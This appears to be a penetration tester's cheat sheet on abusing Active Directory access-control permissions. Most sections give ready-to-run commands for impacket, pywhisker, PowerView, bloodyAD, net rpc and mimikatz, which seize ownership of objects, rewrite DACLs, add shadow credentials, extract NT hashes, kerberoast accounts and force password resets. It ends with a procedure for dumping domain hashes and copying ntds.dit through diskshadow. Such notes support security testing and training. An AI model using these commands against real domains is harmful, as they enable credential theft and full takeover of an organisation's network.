# Discretionary Access Control List abuses

## **GenericAll**
### Description: The attacker has full control over the object.
### Exploit:
Modify the target user’s attributes.
Replace their servicePrincipalName (SPN) for Kerberoasting.
Reset their password directly.
### Tool Example: PowerView, Set-DomainUserPassword
---
## **GenericWrite**
### Description: The attacker can write some properties of the object.
### Exploit:
Add msDS-AllowedToActOnBehalfOfOtherIdentity (for RBCD).
Modify scriptPath or userAccountControl.
### Tool Example: PowerView, Rubeus, SharpHound
---
## **WriteOwner**
### Description: Allows attacker to change ownership of an object.
### Exploit:
Become the owner of an object → modify DACL to give themselves GenericAll.
### Tool Example: PowerView, Set-DomainObjectOwner, impacket-owneredit, impacket-dacledit, pywhisker.py, gettgtpkinit.py

1. takeover the ownership over the object using `Impacket-owneredit`
    ```bash
    impacket-owneredit -action write -new-owner 'owned_user' -target 'vuln_obj' 'gamin.local'/'owner_user':'MyPa$$word123'
    ```
2. edit DACL to gain `FullControl` over that user using `dacledit`
   ```bash
   impacket-dacledit -action 'write'  -rights 'FullControl' -principal 'ryan' -target 'CA_SVC' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
   ```
3. Now we can do _**Shadow Credentials attack**_ using **pywhisker** --action add/clear/list/... 
- 'Stealthy way of compromising object without changing password'
    ```bash
    pywhisker.py -d 'domail.local' -u 'myuser' -p 'Compl3x2Pa$$' --target 'targetUser' --action 'add' # this Generate a key pair and link them to the target user's 'msDS-KeyCredentialLink'
    ```
4. After creating a user certificate (test1.pfx file) that is encrypted with the password we can get from `pywhisker` we use these to get a TGT
    ```bash
    gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache
    ```
5. lastly we can use this TGT to get the NTHASH of the target user using `**getnthash.py**`
    ```bash
    export KRB5CCNAME=user2.ccache
    getnthash.py -key <minikerberos key from gettgtokinit.py> domail.local/target_user
    ```
#### Using PowerShell
   ```powershell
   $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
   $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
   Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y
   Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
   Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
   Get-DomainSPNTicket -Credential $Cred harmj0y | fl
   $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
   Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred

   #cleanup
   Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
   Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All
   ```
---
## **WriteDACL**
### Description: Permission to modify the DACL itself.
### Exploit:
The WriteDacl permission in Active Directory allows users to modify the **Discretionary Access Control List** (**DACL**) of an AD object, giving them the ability to control **object-level** permissions. Consequently, an attacker can write a new **Access Control Entry** (**ACE**) to the target object’s DACL, potentially gaining full control over the target object.
### Tool Example: Add-DomainObjectAcl, PowerView, impacket-dacledit
1. **`impacket-dacledit`**
    ```bash
    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'myuser' -target-dn 'CN=target,CN=Users,DC=domain,DC=local' 'domain.local'/'myuser':'myPassword@1' -dc-ip 192.168.1.3
    ```
    after this we can reset that user password or do targeted kerberoasting using `targetedkerberoast`
    - Targeted Kerberoasting 
        ```bash
        targetedKerberoast.py --dc-ip '192.168.1.3' -v -d 'domain.local' -u 'myuser' -p 'myPassword@1'
        ```
    - Change Password   
        ```bash
        bloodyAD --host "192.168.1.3" -d "domain.local" -u "myuser" -p "Password@1" set password "targer" "newPassword@789"
        ```
2. **`PowerView`**
        ```powershell
        powershell -ep bypass
        Import-Module .PowerView.ps1
        Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_usr" -PrincipalIdentity "myuser"
        ```
    - After this we can do kerberoasting / change password
        ```powershell
        Set-DomainObject -Identity 'target_usr' -Set @{serviceprincipalname='nonexistent/hacking'}
        Get-DomainUser 'target_usr' | Select serviceprincipalname
        $User = Get-DomainUser 'target_usr'
        $User | Get-DomainSPNTicket
        ```
    - Change password
        ```powershell
        $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
        Set-DomainUserPassword -Identity 'target_us' -AccountPassword $NewPassword
        ``
---
## **Self-Membership / Add Member to Group**
### Description: If an attacker has WriteProperty on a group object.
### Exploit:
Add themselves to privileged groups (e.g., Domain Admins).
### Tool Example: Add-DomainGroupMember, net group
---
## **Resource-Based Constrained Delegation (RBCD)**
### Description: Abuse when attacker controls a machine account and has GenericWrite or WriteProperty over a target computer account.
### Exploit:
Configure RBCD to impersonate a privileged user to the computer.
Combine with S4U2Self and S4U2Proxy ticket attacks.
### Tool Example: Rubeus, PowerMad, Impacket
---
## **SIDHistory Injection (when combined with DACL misconfigs)**
### Description: Add a SID of a privileged group (e.g., Domain Admins) to a user’s SIDHistory.
### Exploit:
Often requires admin on the DC or replication rights.
Tool Example: mimikatz, Golden Ticket, DCShadow

## **ForceChangePassword**
### Description
 - If a user has ForceChangePassword dacl over another user/svc account, he can change Force Change their Password, Pretty obvious Right! 😂
### Exploit
 - we can use LINUX ->  `net rpc` , `BloodyAD` , `impacket-changepasswd` 
 - Windows -> `Powerview.ps1` , `mimikatz` 
1. **`net rpc`**
   ```bash
   net rpc password target_user 'Password@987' -U domain.local/myuser%'Password@1' -S 192.168.1.48
   ```
2. **`BloodyAD`**
   ```bash
   bloodyAD --host "192.168.1.48" -d "domain.local" -u "myuser" -p 'myPassword@1' set password "target" 'newPassword@987'
   ```
3. **`impacket-changepasswd`**
   ```bash
   impacket-changepasswd domain.local/target_user@192.168.1.48 -newpass 'Password@1234' -altuser domain.local/myuser -altpass 'Password@1' -reset
   ```
4. **`Powerview`**
   ```powershell
    powershell -ep bypass
    Import-Module .PowerView.ps1
    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
    Set-DomainUserPassword -Identity 'target_user' -AccountPassword $NewPassword
   ```
5. **`mimikatz`**
   ```bash
   lsadump::setntlm /server:domain.local /user:new_user /password:Password@9876
   ```

## **AddSelf**
### Description
attackers can escalate privileges by adding themselves to privileged groups like Domain Admins or Backup Operators. As a result, they gain administrative control, move laterally within the network, access sensitive systems, and maintain persistence. in Addition user can later perform kerberoasting 
### Exploit
1. **`net rpc`**
    ```bash
    net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
    ```
2. **`pth-net`**
    ```bash
    pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
    ```
    - To verify 
       ```bash
        net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
       ```
3. **`BloodyAD`**
   ```bash
   bloodyAD --host "192.168.1.48" -d "DOMAIN.DOM" -u "our-user" -p "Password@1" add groupMember "target group" "our-user"
   ```
4. **`Powerview`**
   ```powershell
    powershell -ep bypass
    Import-Module .PowerView.ps1
    Add-DomainGroupMember -Identity "Domain Admins" -Members "our-user" -Verbose
   ```

#### If we ended up in a *Domain Admin* Group just dump the domain hashes
```bash
impacket-secretsdump 'ignite.local'/'shreya':'Password@1'@'192.168.1.48'
```
#### If we landed in a Backup Operator Group we can dump the hashes from ntds.dit
1. Create a `.dsh` file (distributed shell)
   ```dsh
    set context persistent nowriters
    add volume c: alias obad
    create
    expose %obad% z:
   ```
2. use `unix2dos` to make it windows compatible format
   ```bash
   unix2dos obad.dsh
   ```
3. upload it and on the target machine execute this 
   ```powershell
   diskshadow /s obad.dsh
   ```
4. get the `ntds.dit` into a Temp dir
   ```powershell
   robocopy /b z:windowsntds . ntds.dit
   ```
5. save the SYSTEM registry hive
   ```powershell
   reg save hklm\system C:\Temp\system
   ```
6. Download both and uste `impacket-secretdump` to do the job
   ```bash
   impacket-secretsdump -ntds ntds.dit -system system local
   ```
